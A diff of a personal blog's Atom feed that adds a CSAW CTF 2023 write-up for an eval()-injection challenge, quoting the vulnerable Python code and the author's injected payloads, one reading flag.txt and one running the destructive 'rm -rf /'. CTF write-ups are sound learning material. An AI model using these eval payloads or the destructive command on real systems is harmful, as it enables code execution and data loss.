@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-19T05:04:46-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">JackTheSparow</title><subtitle>Welcome to The Pirates Bay. The website is under development</subtitle><entry><title type="html">NSA Codebreakers 2024</title><link href="http://localhost:4000/nsa-codebreakers-2024" rel="alternate" type="text/html" title="NSA Codebreakers 2024" /><published>2025-01-20T02:38:20-05:00</published><updated>2025-01-20T02:38:20-05:00</updated><id>http://localhost:4000/ctf_writeup</id><content type="html" xml:base="http://localhost:4000/nsa-codebreakers-2024"><![CDATA[<h3 id="task-1">Task 1</h3>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-19T06:02:47-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">JackTheSparow</title><subtitle>Welcome to The Pirates Bay. The website is under development</subtitle><entry><title type="html">NSA Codebreakers 2024</title><link href="http://localhost:4000/nsa-codebreakers-2024" rel="alternate" type="text/html" title="NSA Codebreakers 2024" /><published>2025-01-20T02:38:20-05:00</published><updated>2025-01-20T02:38:20-05:00</updated><id>http://localhost:4000/codebreakers_writeup</id><content type="html" xml:base="http://localhost:4000/nsa-codebreakers-2024"><![CDATA[<h3 id="task-1">Task 1</h3>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span>file shipped.db
 </code></pre></div></div>
@@ -201,7 +201,47 @@ for all features.</p>
 <p><img src="/assets/before_size.png" alt="size-of-qcow2-image-before-compression" /></p>
 
 <h3 id="after-compression">After Compression</h3>
-<p><img src="/assets/after_size.png" alt="size-of-qcow2-image-after-compression" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[KVM qcow2 Image Compression]]></summary></entry><entry><title type="html">Winner CyberCup Hackathon 2 &amp;amp; 3</title><link href="http://localhost:4000/cybercup-hackathon" rel="alternate" type="text/html" title="Winner CyberCup Hackathon 2 &amp;amp; 3" /><published>2023-01-21T02:38:20-05:00</published><updated>2023-01-21T02:38:20-05:00</updated><id>http://localhost:4000/cybercup-hackathon</id><content type="html" xml:base="http://localhost:4000/cybercup-hackathon"><![CDATA[<h3 id="cybercup-20-2023">CyberCup 2.0 2023</h3>
+<p><img src="/assets/after_size.png" alt="size-of-qcow2-image-after-compression" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[KVM qcow2 Image Compression]]></summary></entry><entry><title type="html">CSAW CTF 2023</title><link href="http://localhost:4000/csaw-2023" rel="alternate" type="text/html" title="CSAW CTF 2023" /><published>2023-09-17T03:38:20-04:00</published><updated>2023-09-17T03:38:20-04:00</updated><id>http://localhost:4000/csaw_writeup</id><content type="html" xml:base="http://localhost:4000/csaw-2023"><![CDATA[<h3 id="pwn">Pwn</h3>
+
+<h4 id="my-first-pwnie">My First Pwnie</h4>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Pwn mostly builds on top of rev.
+# While rev is more about understanding how a program works, pwn is more about figuring out how to exploit a program to reach the holy grail: Arbitrary Code Execution
+#
+# If you can execute arbitrary code on a system, that system might as well be yours...because you can do whatever you want with it! (this is the namesake of "pwn".....if you pwn a system, you own the system)
+# Of course, that comes with the limitations of the environment you are executing code in...are you a restricted user, or a super admin?
+# Sometimes you can make yourself a super admin starting from being a restricted user.....but we're not gonna do that right now.
+#
+# For now, I want you to figure out how to execute arbitrary commands on the server running the following code.
+#
+# To prove to me that you can excute whatever commands you want on the server, you'll need to get the contents of `/flag.txt`
+</span>
+<span class="k">try</span><span class="p">:</span>
+  <span class="n">response</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">What</span><span class="sh">'</span><span class="s">s the password? </span><span class="sh">"</span><span class="p">))</span>
+  <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">You entered `</span><span class="si">{</span><span class="n">response</span><span class="si">}</span><span class="s">`</span><span class="sh">"</span><span class="p">)</span>
+  <span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Yay! Correct! Congrats!</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">quit</span><span class="p">()</span>
+<span class="k">except</span><span class="p">:</span>
+  <span class="k">pass</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Nay, that</span><span class="sh">'</span><span class="s">s not it.</span><span class="sh">"</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>I tried different commands such as:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">import</span><span class="p">(</span><span class="sh">'</span><span class="s">subprocess</span><span class="sh">'</span><span class="p">).</span><span class="nf">getoutput</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag.txt</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">import</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">rm -rf /</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Then finally connected to server using Netcat</p>
+
+<p><img src="/assets/csaw_first_pwnie.png" alt="Pwnie Solution" /></p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">
+🚩 csawctf{neigh______}
+</code></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Pwn]]></summary></entry><entry><title type="html">Winner CyberCup Hackathon 2 &amp;amp; 3</title><link href="http://localhost:4000/cybercup-hackathon" rel="alternate" type="text/html" title="Winner CyberCup Hackathon 2 &amp;amp; 3" /><published>2023-01-21T02:38:20-05:00</published><updated>2023-01-21T02:38:20-05:00</updated><id>http://localhost:4000/cybercup-hackathon</id><content type="html" xml:base="http://localhost:4000/cybercup-hackathon"><![CDATA[<h3 id="cybercup-20-2023">CyberCup 2.0 2023</h3>
 
 <p>Overall Positon: Second</p>
 
